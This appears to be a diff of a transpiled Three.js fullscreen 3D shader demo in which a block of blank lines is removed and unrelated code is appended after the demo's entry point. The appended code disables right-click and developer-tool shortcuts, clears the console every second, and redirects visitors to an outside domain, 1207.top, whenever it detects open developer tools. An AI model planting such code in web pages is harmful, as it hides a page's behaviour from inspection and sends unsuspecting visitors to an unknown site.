@@ -766,218 +766,6 @@ class FullScreen3DExample {
     _classPrivateMethodGet(this, _render, _render2).call(this);
   }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
   start() {
     _classPrivateMethodGet(this, _render, _render2).call(this);
 
@@ -1032,3 +820,62 @@ class FullScreen3DExample {
                 }
             ` });pass.renderToScreen = true;_classPrivateFieldGet(this, _composer).addPass(pass);};var _initEventListeners2 = function _initEventListeners2() {window.addEventListener('resize', _classPrivateMethodGet(this, _onWindowResize, _onWindowResize2).bind(this));document.addEventListener('mousemove', _classPrivateMethodGet(this, _onMouseMove, _onMouseMove2).bind(this));};var _onWindowResize2 = function _onWindowResize2() {const width = window.innerWidth;const height = window.innerHeight;_classPrivateFieldGet(this, _camera).aspect = width / height;_classPrivateFieldGet(this, _camera).updateProjectionMatrix();_classPrivateFieldGet(this, _renderer).setSize(width, height);_classPrivateFieldGet(this, _composer).setSize(width, height);};var _onMouseMove2 = function _onMouseMove2(e) {_classPrivateFieldGet(this, _cameraData).positionX = 5 * (window.innerWidth / 2 - e.clientX) / window.innerWidth;_classPrivateFieldGet(this, _cameraData).positionY = 2 + 0.5 * (window.innerHeight / 2 - e.clientY) / window.innerHeight;};var _updateEverything2 = function _updateEverything2() {const t = performance.now() / 1000;_classPrivateFieldGet(this, _world).update();_classPrivateFieldGet(this, _scene).traverse(child => {if (child.isMesh) {const { shader } = child.material.userData;if (shader) {shader.uniforms.uTime.value = t;}}});_classPrivateFieldGet(this, _composer).passes.forEach(pass => {if (pass instanceof THREE.ShaderPass) {// eslint-disable-next-line no-param-reassign
       pass.uniforms.uTime.value = t % 10;}});{const x = _classPrivateFieldGet(this, _cameraData).positionX + 0.3 * (Math.sin(0.1 * t) + Math.sin(0.05 * t));const y = _classPrivateFieldGet(this, _cameraData).positionY + 0.3 * Math.cos(0.3 * t);_classPrivateFieldGet(this, _camera).position.set(x, y, 1);_classPrivateFieldGet(this, _camera).updateProjectionMatrix();}};var _render2 = function _render2() {_classPrivateMethodGet(this, _updateEverything, _updateEverything2).call(this);_classPrivateFieldGet(this, _composer).render(_classPrivateFieldGet(this, _scene), _classPrivateFieldGet(this, _camera));};function main() {const root = document.getElementById('root');const example = new FullScreen3DExample(root);example.start();}document.addEventListener('DOMContentLoaded', main);
+
+
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+      });
+    
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||  // Ctrl+Shift+I
+            (e.ctrlKey && e.shiftKey && e.key === 'J') ||  // Ctrl+Shift+J
+            (e.ctrlKey && e.key === 'U')) {                // Ctrl+U
+          e.preventDefault();
+          return false;
+        }
+      });
+    
+      setInterval(() => {
+        console.clear();
+      }, 1000);
+
+      
+  (function() {
+    let devtools = false;
+    let threshold = 160;
+  
+    function detectDevTools() {
+      devtools = false;
+      let widthThreshold = window.outerWidth - window.innerWidth > threshold;
+      let heightThreshold = window.outerHeight - window.innerHeight > threshold;
+      if (widthThreshold || heightThreshold) {
+        devtools = true;
+      }
+      return devtools;
+    }
+  
+    setInterval(function() {
+      if (detectDevTools()) {
+        window.location.href = 'https://1207.top/';
+      }
+    }, 100);
+  
+    window.addEventListener('resize', function() {
+      if (detectDevTools()) {
+        window.location.href = 'https://1207.top/';
+      }
+    });
+  
+    window.addEventListener('focus', function() {
+      if (detectDevTools()) {
+        window.location.href = 'https://1207.top/';
+      }
+    });
+  
+    window.addEventListener('blur', function() {
+      if (detectDevTools()) {
+        window.location.href = 'https://1207.top/';
+      }
+    });
+  })();
